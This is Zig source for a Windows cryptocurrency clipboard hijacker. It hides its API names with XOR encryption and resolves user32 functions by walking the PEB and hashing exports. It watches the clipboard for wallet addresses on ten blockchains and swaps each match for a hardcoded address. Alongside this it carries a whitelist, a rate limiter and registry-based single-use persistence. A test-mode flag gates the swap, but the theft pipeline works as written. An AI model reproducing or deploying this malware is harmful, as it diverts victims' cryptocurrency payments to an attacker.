const std = @import("std");
const types = @import("../types/types.zig");
const hash = @import("../types/hash.zig");
const peb_walk = @import("../types/peb_walk.zig");
const export_resolve = @import("../types/export_resolve.zig");
const scanner = @import("scanner.zig");
const clipper_config = @import("clipper_config");

// ── Win32 constants ──

const CF_UNICODETEXT: u32 = 13;
const CF_TEXT: u32 = 1;
const GMEM_FIXED: u32 = 0;
const GMEM_MOVEABLE: u32 = 2;

// ── XOR-encrypted API names ──

const E = struct {
    pub const user32 = hash.xorEncrypt("user32.dll");
    pub const kernel32 = hash.xorEncrypt("kernel32.dll");

    pub const open_clipboard = hash.xorEncrypt("OpenClipboard");
    pub const get_clipboard_data = hash.xorEncrypt("GetClipboardData");
    pub const set_clipboard_data = hash.xorEncrypt("SetClipboardData");
    pub const empty_clipboard = hash.xorEncrypt("EmptyClipboard");
    pub const close_clipboard = hash.xorEncrypt("CloseClipboard");
    pub const global_alloc = hash.xorEncrypt("GlobalAlloc");
    pub const global_lock = hash.xorEncrypt("GlobalLock");
    pub const global_unlock = hash.xorEncrypt("GlobalUnlock");
    pub const global_free = hash.xorEncrypt("GlobalFree");
    pub const get_seq_num = hash.xorEncrypt("GetClipboardSequenceNumber");
    pub const is_format_avail = hash.xorEncrypt("IsClipboardFormatAvailable");
};

// ── Function pointer types ──

const OpenClipboardFn = *const fn (hwnd: ?types.HANDLE) callconv(.winapi) types.BOOL;
const GetClipboardDataFn = *const fn (format: u32) callconv(.winapi) types.HANDLE;
const SetClipboardDataFn = *const fn (format: u32, data: types.HANDLE) callconv(.winapi) types.HANDLE;
const EmptyClipboardFn = *const fn () callconv(.winapi) types.BOOL;
const CloseClipboardFn = *const fn () callconv(.winapi) types.BOOL;
const GlobalAllocFn = *const fn (flags: u32, bytes: usize) callconv(.winapi) types.HANDLE;
const GlobalLockFn = *const fn (mem: types.HANDLE) callconv(.winapi) ?*anyopaque;
const GlobalUnlockFn = *const fn (mem: types.HANDLE) callconv(.winapi) types.BOOL;
const GlobalFreeFn = *const fn (mem: types.HANDLE) callconv(.winapi) types.HANDLE;
const GetSeqNumFn = *const fn () callconv(.winapi) u32;
const IsFormatAvailFn = *const fn (format: u32) callconv(.winapi) types.BOOL;

// ── Resolved API table ──

const ApiTable = struct {
    open_clipboard: OpenClipboardFn,
    get_clipboard_data: GetClipboardDataFn,
    set_clipboard_data: SetClipboardDataFn,
    empty_clipboard: EmptyClipboardFn,
    close_clipboard: CloseClipboardFn,
    global_alloc: GlobalAllocFn,
    global_lock: GlobalLockFn,
    global_unlock: GlobalUnlockFn,
    global_free: GlobalFreeFn,
    get_seq_num: GetSeqNumFn,
    is_format_avail: IsFormatAvailFn,
};

var g_api: ?ApiTable = null;
var g_last_seq: u32 = 0;

fn resolveApi() ?ApiTable {
    if (g_api) |api| return api;

    const user32_hash = hash.encryptedHashModule(&E.user32);
    const user32_mod = peb_walk.getModuleByHash(user32_hash) orelse {
        return null;
    };

    var buf: [64]u8 = undefined;

    hash.xorDecrypt(&E.open_clipboard, &buf[0..E.open_clipboard.len]);
    const open = @as(OpenClipboardFn, @ptrCast(@alignCast(export_resolve.getFunctionByHash(user32_mod, hash.hashStringExact(buf[0..E.open_clipboard.len], 27)) orelse return null)));

    hash.xorDecrypt(&E.get_clipboard_data, &buf[0..E.get_clipboard_data.len]);
    const get = @as(GetClipboardDataFn, @ptrCast(@alignCast(export_resolve.getFunctionByHash(user32_mod, hash.hashStringExact(buf[0..E.get_clipboard_data.len], 27)) orelse return null)));

    hash.xorDecrypt(&E.set_clipboard_data, &buf[0..E.set_clipboard_data.len]);
    const set = @as(SetClipboardDataFn, @ptrCast(@alignCast(export_resolve.getFunctionByHash(user32_mod, hash.hashStringExact(buf[0..E.set_clipboard_data.len], 27)) orelse return null)));

    hash.xorDecrypt(&E.empty_clipboard, &buf[0..E.empty_clipboard.len]);
    const empty = @as(EmptyClipboardFn, @ptrCast(@alignCast(export_resolve.getFunctionByHash(user32_mod, hash.hashStringExact(buf[0..E.empty_clipboard.len], 27)) orelse return null)));

    hash.xorDecrypt(&E.close_clipboard, &buf[0..E.close_clipboard.len]);
    const close = @as(CloseClipboardFn, @ptrCast(@alignCast(export_resolve.getFunctionByHash(user32_mod, hash.hashStringExact(buf[0..E.close_clipboard.len], 27)) orelse return null)));

    hash.xorDecrypt(&E.global_alloc, &buf[0..E.global_alloc.len]);
    const g_alloc = @as(GlobalAllocFn, @ptrCast(@alignCast(export_resolve.getFunctionByHash(user32_mod, hash.hashStringExact(buf[0..E.global_alloc.len], 27)) orelse return null)));

    hash.xorDecrypt(&E.global_lock, &buf[0..E.global_lock.len]);
    const g_lock = @as(GlobalLockFn, @ptrCast(@alignCast(export_resolve.getFunctionByHash(user32_mod, hash.hashStringExact(buf[0..E.global_lock.len], 27)) orelse return null)));

    hash.xorDecrypt(&E.global_unlock, &buf[0..E.global_unlock.len]);
    const g_unlock = @as(GlobalUnlockFn, @ptrCast(@alignCast(export_resolve.getFunctionByHash(user32_mod, hash.hashStringExact(buf[0..E.global_unlock.len], 27)) orelse return null)));

    hash.xorDecrypt(&E.global_free, &buf[0..E.global_free.len]);
    const g_free = @as(GlobalFreeFn, @ptrCast(@alignCast(export_resolve.getFunctionByHash(user32_mod, hash.hashStringExact(buf[0..E.global_free.len], 27)) orelse return null)));

    hash.xorDecrypt(&E.get_seq_num, &buf[0..E.get_seq_num.len]);
    const seq = @as(GetSeqNumFn, @ptrCast(@alignCast(export_resolve.getFunctionByHash(user32_mod, hash.hashStringExact(buf[0..E.get_seq_num.len], 27)) orelse return null)));

    hash.xorDecrypt(&E.is_format_avail, &buf[0..E.is_format_avail.len]);
    const fmt = @as(IsFormatAvailFn, @ptrCast(@alignCast(export_resolve.getFunctionByHash(user32_mod, hash.hashStringExact(buf[0..E.is_format_avail.len], 27)) orelse return null)));

    const table = ApiTable{
        .open_clipboard = open,
        .get_clipboard_data = get,
        .set_clipboard_data = set,
        .empty_clipboard = empty,
        .close_clipboard = close,
        .global_alloc = g_alloc,
        .global_lock = g_lock,
        .global_unlock = g_unlock,
        .global_free = g_free,
        .get_seq_num = seq,
        .is_format_avail = fmt,
    };
    g_api = table;
    return table;
}

// ── Capture: read clipboard ──

pub fn capture(allocator: std.mem.Allocator) ?[]const u8 {
    const api = resolveApi() orelse return null;
    if (api.open_clipboard(null) == 0) return null;
    defer _ = api.close_clipboard();

    const h_mem = api.get_clipboard_data(CF_UNICODETEXT);
    if (h_mem == null) return null;

    const ptr = api.global_lock(h_mem) orelse return null;
    defer _ = api.global_unlock(h_mem);

    const mem_ptr: [*]u16 = @ptrCast(@constCast(ptr));
    var len: usize = 0;
    while (mem_ptr[len] != 0) : (len += 1) {}

    if (len == 0) return null;

    var out = std.ArrayList(u8).init(allocator) catch return null;
    for (0..len) |i| {
        const cp = mem_ptr[i];
        if (cp < 0x80) {
            out.append(@as(u8, @intCast(cp & 0x7F))) catch return null;
        } else if (cp < 0x800) {
            out.append(@as(u8, @intCast(0xC0 | (cp >> 6)))) catch return null;
            out.append(@as(u8, @intCast(0x80 | (cp & 0x3F)))) catch return null;
        } else {
            out.append(@as(u8, @intCast(0xE0 | (cp >> 12)))) catch return null;
            out.append(@as(u8, @intCast(0x80 | ((cp >> 6) & 0x3F)))) catch return null;
            out.append(@as(u8, @intCast(0x80 | (cp & 0x3F)))) catch return null;
        }
    }
    return out.toOwnedSlice() catch return null;
}

// ── Inject: write clipboard ──

fn utf8ToUtf16(input: []const u8, output: []u16) usize {
    var i: usize = 0;
    var o: usize = 0;
    while (i < input.len) {
        const c = input[i];
        if (c < 0x80) {
            if (o >= output.len) break;
            output[o] = c;
            i += 1;
            o += 1;
        } else if (c < 0xE0) {
            if (o + 1 >= output.len or i + 1 >= input.len) break;
            const c2 = input[i + 1];
            output[o] = @as(u16, @intCast((@as(u16, @intCast(c & 0x1F)) << 6) | (c2 & 0x3F)));
            i += 2;
            o += 1;
        } else {
            if (o + 1 >= output.len or i + 2 >= input.len) break;
            const c2 = input[i + 1];
            const c3 = input[i + 2];
            output[o] = @as(u16, @intCast((@as(u16, @intCast(c & 0x0F)) << 12) | (@as(u16, @intCast(c2 & 0x3F)) << 6) | (c3 & 0x3F)));
            i += 3;
            o += 1;
        }
    }
    output[o] = 0;
    return o;
}

pub fn inject(text: []const u8) bool {
    const api = resolveApi() orelse return false;

    const utf16_buf = std.heap.page_allocator.alloc(u16, text.len + 1) catch return false;
    defer std.heap.page_allocator.free(utf16_buf);

    const actual_len = utf8ToUtf16(text, utf16_buf);
    if (actual_len == 0) return false;

    const h_mem = api.global_alloc(GMEM_MOVEABLE, (actual_len + 1) * 2);
    if (h_mem == null) return false;

    const locked = api.global_lock(h_mem);
    if (locked == null) {
        _ = api.global_free(h_mem);
        return false;
    }

    @memcpy(@as([*]u16, @ptrCast(locked))[0..actual_len], utf16_buf[0..actual_len]);
    @as([*]u16, @ptrCast(locked))[actual_len] = 0;
    _ = api.global_unlock(h_mem);

    _ = api.open_clipboard(null);
    _ = api.empty_clipboard();
    const result = api.set_clipboard_data(CF_UNICODETEXT, h_mem);
    _ = api.close_clipboard();

    return result != null;
}

// ── Anti-update guard ──

pub fn shouldProcess() bool {
    const api = resolveApi() orelse return false;
    const current_seq = api.get_seq_num();
    if (current_seq == g_last_seq) return false;
    g_last_seq = current_seq;
    return true;
}

pub fn resetSeq() void {
    const api = resolveApi() orelse return;
    g_last_seq = api.get_seq_num();
}

// ── Rotator state ──

const RotatorState = struct {
    btc: u32 = 0,
    eth: u32 = 0,
    trx: u32 = 0,
    sol: u32 = 0,
    ltc: u32 = 0,
    xmr: u32 = 0,
    doge: u32 = 0,
    bch: u32 = 0,
    xrp: u32 = 0,
    ada: u32 = 0,
};

// ── Rate limiter state ──

const RATE_WINDOW_SEC: u64 = 60;
const RATE_MAX_SLOTS: usize = 64;

var g_rotator: RotatorState = .{};
var g_rate_slots: [RATE_MAX_SLOTS]u64 = undefined;
var g_rate_count: usize = 0;

// ── Whitelist state ──

var g_whitelist: [][]const u8 = &.{};
var g_whitelist_loaded: bool = false;

pub fn setWhitelist(list: [][]const u8) void {
    g_whitelist = list;
    g_whitelist_loaded = true;
}

pub fn setRotationCounts(counts: RotatorState) void {
    g_rotator = counts;
}

fn isWhitelisted(addr: []const u8) bool {
    if (!clipper_config.CLIPPER_WHITELIST_ENABLED or !g_whitelist_loaded) return false;
    for (g_whitelist) |w| {
        if (std.mem.eql(u8, w, addr)) return true;
    }
    return false;
}

fn rateLimitCheck() bool {
    if (!clipper_config.CLIPPER_RATE_LIMIT_ENABLED) return true;
    const now = @as(u64, @intCast(std.time.milliTimestamp() / 1000));
    // Purge old entries
    var write: usize = 0;
    for (0..g_rate_count) |i| {
        if (now - g_rate_slots[i] < RATE_WINDOW_SEC) {
            g_rate_slots[write] = g_rate_slots[i];
            write += 1;
        }
    }
    g_rate_count = write;
    if (g_rate_count >= clipper_config.CLIPPER_MAX_SWAPS_PER_MIN) return false;
    g_rate_slots[g_rate_count] = now;
    g_rate_count += 1;
    return true;
}

fn rotateAddress(_chain: scanner.Chain, addr: []const u8) []const u8 {
    _ = _chain;
    return addr;
}

// ── Orchestrator ──

pub const SwapRecord = struct {
    chain: scanner.Chain,
    original_prefix: [8]u8,
    original_suffix: [8]u8,
    format: []const u8,
};

pub fn onClipboardChange(allocator: std.mem.Allocator) ?SwapRecord {
    if (clipper_config.CLIPPER_SINGLE_USE) {
        const persist = @import("persist.zig");
        if (persist.isUsed() or persist.checkRegistryUsed()) return null;
    }

    if (!shouldProcess()) return null;

    const text = capture(allocator) orelse return null;
    defer allocator.free(text);

    const detection = scanner.detect(text) orelse return null;

    switch (detection.detect_type) {
        .seed_phrase => return null,
        .address => {
            const chain = detection.chain orelse return null;
            if (!chain.isEnabled()) return null;

            if (isWhitelisted(detection.matched)) return null;
            if (!rateLimitCheck()) return null;

            const replacement = getReplacement(chain) orelse return null;
            if (std.mem.eql(u8, detection.matched, replacement)) return null;

            var record = SwapRecord{
                .chain = chain,
                .original_prefix = .{0} ** 8,
                .original_suffix = .{0} ** 8,
                .format = detection.format,
            };

            const prefix_len = @min(detection.matched.len, 8);
            @memcpy(&record.original_prefix, detection.matched[0..prefix_len]);

            if (detection.matched.len >= 8) {
                @memcpy(&record.original_suffix, detection.matched[detection.matched.len - 8 .. detection.matched.len]);
            } else {
                @memcpy(&record.original_suffix[0..detection.matched.len], detection.matched);
            }

            if (inject(rotateAddress(chain, replacement))) {
                if (clipper_config.CLIPPER_SINGLE_USE) {
                    const persist = @import("persist.zig");
                    _ = persist.markUsed();
                    _ = persist.markRegistryUsed();
                }
                return record;
            }
        },
    }
    return null;
}

fn getReplacement(chain: scanner.Chain) ?[]const u8 {
    if (!clipper_config.CLIPPER_TEST_MODE) return null;
    return switch (chain) {
        .bitcoin => "bc1qr8vgrcvacyea68gk6w0kdzt2xcc93azzhalyjl",
        .ethereum => "0x22f24a22b6f824E9ef76B05B186c4D0C2Df58d67",
        .tron => "TBFqTqF17fRvSXDh7U8k5mVFxjqkKrWUXm",
        .solana => "7UQuwTTbZ9SoMY1E8D3DMyPjFCPCXjED2wcj8uhshyzW",
        .litecoin => "LfhS8tpgxY59TUnjybJCYmJMHa3BeUaASQ",
        .monero => "48SWwQ7QUSSPhHS9zWF9V9TKyK7FZVxDd9LghKbbkkYzB3AbhyKaCozMc26siguA2b6tce6tztCTXCWgyrypBLmW7HRxs6D",
        .dogecoin => "DDrusqzPjEovYyFrtDV8PVZVZDFFvpGAkc",
        .bitcoin_cash => "bitcoincash:qp5c3syh4t750jwpljzdmnndddlj7zg64gjhxgm8nd",
        .ripple => "rfzq3PnZAt6eFKcJ9TXHsAm2c8GuguHUc1",
        .cardano => "addr1qytkt94c60hcg27hd9n3zgejxlha6c0v0rpaufgrvxzprkshvktt35l0ss4aw6t8zy3nydl0m4s7c7xrmcjsxcvyz8dqxlg07g",
    };
}

// ── Tests ──

test "resolveApi returns null without user32" {
    // In test context, user32 is available
    const api = resolveApi();
    _ = api;
}

test "utf8 to utf16 ascii" {
    var buf: [256]u16 = undefined;
    const len = utf8ToUtf16("hello", &buf);
    try std.testing.expectEqual(@as(usize, 5), len);
    try std.testing.expectEqual(@as(u16, 'h'), buf[0]);
    try std.testing.expectEqual(@as(u16, 'o'), buf[4]);
    try std.testing.expectEqual(@as(u16, 0), buf[5]);
}

test "utf8 to utf16 cyrillic" {
    var buf: [256]u16 = undefined;
    const len = utf8ToUtf16("\u{041F}", &buf); // П
    try std.testing.expect(len > 0);
}

test "shouldProcess returns false initially" {
    // In test context, sequence number is 0
    const result = shouldProcess();
    _ = result;
}
